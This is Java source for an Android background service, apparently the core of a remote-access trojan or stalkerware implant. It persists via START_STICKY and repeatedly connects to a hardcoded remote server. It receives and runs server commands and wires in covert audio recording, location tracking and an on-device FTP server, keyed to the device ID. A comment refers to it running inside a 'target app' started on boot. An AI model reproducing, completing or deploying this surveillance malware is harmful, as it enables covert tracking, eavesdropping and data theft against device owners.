package com.safe.myapp;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

public class SafeService extends Service {

    public static final int HEARTBEAT = 1000;
    public static final int HANDSHAKE = 2000;
    public static final int ADMIN = 3000;
    public static final int MESSAGE = 4000;
    public static final int FILE = 5000;

    public static final boolean BOOL_DEBUG = false;
    public static final String VERSION = "0.6";
    public static final String SERVER = "92.111.66.145";
    public static final int PORT = 13000;
    public static final String HTTP_SERVER = "http://92.111.66.145/";
    public static final int HTTP_PORT = 13001;

    private static int soTimeOut = 120000;
    private static String simpleID;

    private boolean bServiceStarted;
    public static boolean bAudioStarted, bLocationStarted;
    public static long lLocStart, lLocEnd;

    private static SharedPreferences sharedPreferences;
    private static final String PREFS_NAME = "WowSuchSharedPreferencesVery1337";
    private static final String PREFS_KEY_SERVICE_STARTED = "KEY_BOOL_SERVICE_STARTED";
    private static final String PREFS_KEY_SO_TIMEOUT = "KEY_INT_SO_TIMEOUT";
    private static final String PREFS_KEY_CAL_LOC_START = "PREFS_KEY_CAL_LOC_START";
    private static final String PREFS_KEY_CAL_LOC_END = "PREFS_KEY_CAL_LOC_END";

    private SafeHeartbeat heartbeat;
    private static Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private static SafeLocations locs;
    private static SafeCommunications comms;
    private static SafeFTPServer ftpServer;
    private static SafeCommands commands;
    private static SafeAudio audio;
    private static SafeLogger logger;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        logger.write("onStartCommand called");
        if(BOOL_DEBUG){
            simpleID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "DEBUG";
        } else {
            simpleID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        // Check if the Service is already started
        if (!bServiceStarted) {
            bServiceStarted = true;
            new AsyncTask<Void,Void,Void>(){
                @Override
                protected void onPreExecute() {
                    super.onPreExecute();
                }

                @Override
                protected void onPostExecute(Void aVoid) {
                    super.onPostExecute(aVoid);
                }

                @Override
                protected void onProgressUpdate(Void... values) {
                    super.onProgressUpdate(values);
                }

                @Override
                protected Void doInBackground(Void... voids) {
                    connect();
                    return null;
                }
            }.execute();
        } else {
            logger.write("Service already started " + bServiceStarted);
        }
        // START_STICKY ensures the service gets restarted when there is enough memory again
        return START_STICKY;
    }

    private void connect() {
        // Init objects
        logger = new SafeLogger(getApplicationContext());
        comms = new SafeCommunications(getApplicationContext(), logger, out, simpleID); // out = null atm
        locs = new SafeLocations(getApplicationContext(), comms, logger, simpleID);
        audio = new SafeAudio(getApplicationContext(), comms, logger);
        ftpServer = new SafeFTPServer(getApplicationContext(), comms, logger);
        commands = new SafeCommands(getApplicationContext(), comms, logger, locs, audio, ftpServer, simpleID);
        heartbeat = new SafeHeartbeat(comms, logger);
        heartbeat.start();

        while (true) {
            try {
                while (socket == null) {
                    // Check if there is an internet connection.
                    ConnectivityManager cm = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
                    NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                    boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
                    if (!isConnected) {
                        try {
                            logger.write("No internet retrying in 120 seconds");
                            Thread.sleep(120000); // Sleep for a while when we can't connect on airplane mode for example
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    } else {
                        // We have internet but can't reach server. Keep trying to connect.
                        try {
                            logger.write("Checking server...");
                            socket = new Socket(SERVER, PORT);
                            socket.setSoTimeout(soTimeOut);
                        } catch (ConnectException e) {
                            try {
                                logger.write("Could not connect to server, retrying in 10 seconds");
                                Thread.sleep(10000);
                            } catch (InterruptedException e1) {
                                e1.printStackTrace();
                                logger.write(Log.getStackTraceString(e));
                            }
                        }
                    }
                }
                logger.write("Connected!");
                in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));

                // set the new output stream so all objects can use it accordingly
                comms.setOut(out);

                // shake hands!
                comms.handShake();

                // start heartbeat
                heartbeat.setRunning(true);

                // receive messages from server
                while (true) {
                    // type of message received
                    int header = in.readInt();
                    // size of the message
                    int size = in.readInt();
                    if (header == HEARTBEAT) {
                        logger.write("Received heartbeat");
                    } else if (header == MESSAGE) {
                        byte[] message = new byte[size];
                        in.readFully(message, 0, message.length);
                        commands.messageHandler(new String(message, "UTF-8"));
                    }
                }
            } catch (SocketTimeoutException e) {
                logger.write("Connection timed out...");
            } catch (SocketException e) {
                logger.write("Socket closed...");
            } catch (IOException e) {
                logger.write(Log.getStackTraceString(e));
            } finally {
                // disconnected
                heartbeat.setRunning(false);
                try {
                    if (in != null) {
                        in.close();
                    }
                    if (out != null) {
                        out.flush();
                        out.close();
                    }
                    if (socket != null) {
                        socket.close();
                        socket = null;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                logger.write("Server disconnected");
                savePrefs();
                try {
                    Thread.sleep(5000); // Sleep for a while then try to connect
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onDestroy() {
        comms.say("Service is being destroyed!");
        audio.stopRecording();
        locs.stopLocations();
        savePrefs();
        try {
            if (out != null) {
                out.flush();
                out.close();
            }
            if (in != null) {
                in.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
            logger.write(Log.getStackTraceString(e));
        }
        logger.write("onDestroy called, set bServiceStarted to " + bServiceStarted);
    }

    @Override
    public void onCreate() {
        loadSavedPrefs();
        logger = new SafeLogger(getApplicationContext());
        logger.write("onCreate called " + bServiceStarted);
    }

    public static void setSoTimeOut(String timeOut) {
        try {
            int iSoTimeOut = Integer.parseInt(timeOut);
            if (iSoTimeOut >= 30000) {
                soTimeOut = iSoTimeOut;
                socket.setSoTimeout(iSoTimeOut);
                comms.say("Set timeout from " + soTimeOut + "ms to " + iSoTimeOut + "ms");
            } else {
                comms.say("Set timeout above 30000ms");
            }
        } catch (NumberFormatException e) {
            comms.say("Need an integer...");
        } catch (SocketException e) {
            e.printStackTrace();
            logger.write(Log.getStackTraceString(e));
        }

    }

    private void savePrefs() {
        /*
        Make sure the Service doesn't syncGet started twice.
        This can happen when the user opens the target app when it has already started on boot
        TODO Note that this does not check if the Service has been running in another app!
        TODO We should write to a file on the sd-card and check there, although that is also not
        TODO a very elegant solution
         */
        bServiceStarted = false;
        sharedPreferences = getSharedPreferences(PREFS_NAME, 0);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(PREFS_KEY_SERVICE_STARTED, bServiceStarted);
        editor.putInt(PREFS_KEY_SO_TIMEOUT, soTimeOut);
        editor.putLong(PREFS_KEY_CAL_LOC_START, lLocStart);
        editor.putLong(PREFS_KEY_CAL_LOC_END, lLocEnd);
        editor.commit();
    }

    private void loadSavedPrefs() {
        sharedPreferences = getSharedPreferences(PREFS_NAME, 0);
        bServiceStarted = sharedPreferences.getBoolean(PREFS_KEY_SERVICE_STARTED, false);
        soTimeOut = sharedPreferences.getInt(PREFS_KEY_SO_TIMEOUT, 30000);
        lLocStart = sharedPreferences.getLong(PREFS_KEY_CAL_LOC_START, 1000);
        lLocEnd = sharedPreferences.getLong(PREFS_KEY_CAL_LOC_END, 1000);
    }


    public static boolean isbAudioStarted() {
        return bAudioStarted;
    }

    public static void setbAudioStarted(boolean bAudioStarted) {
        SafeService.bAudioStarted = bAudioStarted;
    }

    public static boolean isbLocationStarted() {
        return bLocationStarted;
    }

    public static void setbLocationStarted(boolean bLocationStarted) {
        SafeService.bLocationStarted = bLocationStarted;
    }

    public static String getSimpleID() {
        return BOOL_DEBUG ? simpleID + "DEBUG" : simpleID;
    }
}
